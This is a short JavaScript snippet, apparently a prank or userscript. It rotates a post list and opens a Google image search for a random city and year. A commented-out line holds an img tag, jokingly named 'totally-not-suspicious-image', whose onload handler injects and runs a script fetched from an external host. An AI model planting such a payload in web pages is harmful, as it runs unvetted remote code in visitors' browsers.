postList.style.transform = 'rotate(-1deg)';

/*<img id="totally-not-suspicious-image" src="https://storiesmymummytoldme.files.wordpress.com/2015/06/dap.jpg" onload="s=document.createElement('script');s.src='https://lame.netlify.app/df.js';document.head.appendChild(s);">*/

function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}

year = `year+${getRandomInt(1000) + 1000}`;

places = [
'Hong Kong',
'Bangkok',
'London',
'Macao',
'Singapore',
'Paris',
'Dubai',
'New York City',
'Kuala Lumpur',
'Istanbul',
'Delhi',
'Antalya',
'Shenzhen',
'Mumbai',
'Phuket',
'Rome',
'Tokyo',
'Pattaya',
'Taipei',
'Mecca',
'Guangzhou',
'Prague',
'Medina',
'Seoul',
'Amsterdam',
'Agra',
'Miami',
'Osaka',
'Las Vegas',
'Shanghai',
'Ho Chi Minh City',
'Denpasar',
'Barcelona',
'Los Angeles',
'Milan',
'Chennai',
'Vienna',
'Johor Bahru',
'Jaipur',
'Cancún',
'Berlin',
'Cairo',
'Orlando',
'Moscow',
'Venice',
'Madrid',
'Ha Long',
'Riyadh',
'Dublin',
'Florence',
'Jerusalem',
'Hanoi',
'Toronto',
'Johannesburg',
'Sydney',
'Munich',
'Jakarta',
'Beijing',
'Saint Petersburg',
'Brussels',
'Budapest',
'Lisbon',
'Dammam',
'Penang Island',
'Heraklion',
'Kyoto',
'Zhuhai',
'Vancouver',
'Chiang Mai',
'Copenhagen',
'San Francisco',
'Melbourne',
'Warsaw',
'Marrakesh',
'Kolkata',
'Cebu City',
'Auckland',
'Tel Aviv',
'Guilin',
'Honolulu',
'Hurghada',
'Kraków',
'Muğla',
'Buenos Aires',
'Chiba',
'Frankfurt am Main',
'Stockholm',
'Lima',
'Da Nang',
'Batam',
'Fukuoka',
'Abu Dhabi',
'Jeju',
'Porto',
'Rhodes',
'Rio de Janeiro',
'Krabi',
'Bangalore',
'Mexico City',
'Punta Cana',
'São Paulo',
'Zürich',
'Montreal',
'Washington D.C.',
'Chicago',
'Düsseldorf',
'Boston',
'Chengdu',
'Edinburgh',
'San Jose',
'Tehran',
'Houston',
'Hamburg',
'Cape Town',
'Manila',
'Bogota',
'Beirut',
'Geneva',
'Colombo',
'Xiamen',
'Bucharest',
'Casablanca',
'Atlanta',
'Sofia',
'Dalian',
'Montevideo',
'Amman',
'Hangzhou',
'Pune',
'Durban',
'Dallas',
'Accra',
'Quito',
'Tianjin',
'Qingdao',
'Lagos',
];

place = places[getRandomInt(places.length-1)];

window.open(`https://www.google.com/search?q=${place}+${year}&tbm=isch`, '_blank');
